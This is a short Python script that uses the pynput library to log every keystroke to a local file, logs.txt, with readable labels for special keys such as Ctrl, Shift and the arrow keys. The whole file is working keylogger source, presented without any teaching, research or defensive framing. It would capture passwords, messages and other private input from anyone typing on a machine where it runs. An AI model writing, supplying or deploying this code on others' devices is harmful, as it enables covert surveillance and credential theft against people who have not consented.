from pynput.keyboard import Listener, Key

def write_to_file(key):
    special_keys = {
        Key.alt: ' |Alt| ',
        Key.alt_gr: ' |AltGr| ',
        Key.alt_l: ' |Left Alt| ',
        Key.alt_r: ' |Right Alt| ',
        Key.backspace: ' |Backspace| ',
        Key.caps_lock: ' |CapsLock| ',
        Key.cmd: ' |Command (Super/Windows)| ',
        Key.cmd_l: ' |Left Command| ',
        Key.cmd_r: ' |Right Command| ',
        Key.ctrl: ' |Ctrl| ',
        Key.ctrl_l: ' |Left Ctrl| ',
        Key.ctrl_r: ' |Right Ctrl| ',
        Key.delete: ' |Delete| ',
        Key.down: ' |Down Arrow| ',
        Key.end: ' |End| ',
        Key.enter: ' |Enter| ',
        Key.esc: ' |Esc| ',
        Key.f1: ' |F1| ',
        Key.home: ' |Home| ',
        Key.insert: ' |Insert| ',
        Key.left: ' |Left Arrow| ',
        Key.menu: ' |Menu| ',
        Key.num_lock: ' |NumLock| ',
        Key.page_down: ' |PageDown| ',
        Key.page_up: ' |PageUp| ',
        Key.pause: ' |Pause/Break| ',
        Key.print_screen: ' |PrintScreen| ',
        Key.right: ' |Right Arrow| ',
        Key.scroll_lock: ' |ScrollLock| ',
        Key.shift: ' |Shift| ',
        Key.shift_l: ' |Left Shift| ',
        Key.shift_r: ' |Right Shift| ',
        Key.tab: ' |Tab| ',
        Key.up: ' |Up Arrow| ',
    }

    letter = special_keys.get(key, str(key).replace("'",  ""))

    if letter == 'Key.space':
        letter = ' '

    with open("logs.txt", 'a') as f:
        f.write(letter)

# Collecting events until stopped
with Listener(on_press=write_to_file) as l:
    l.join()

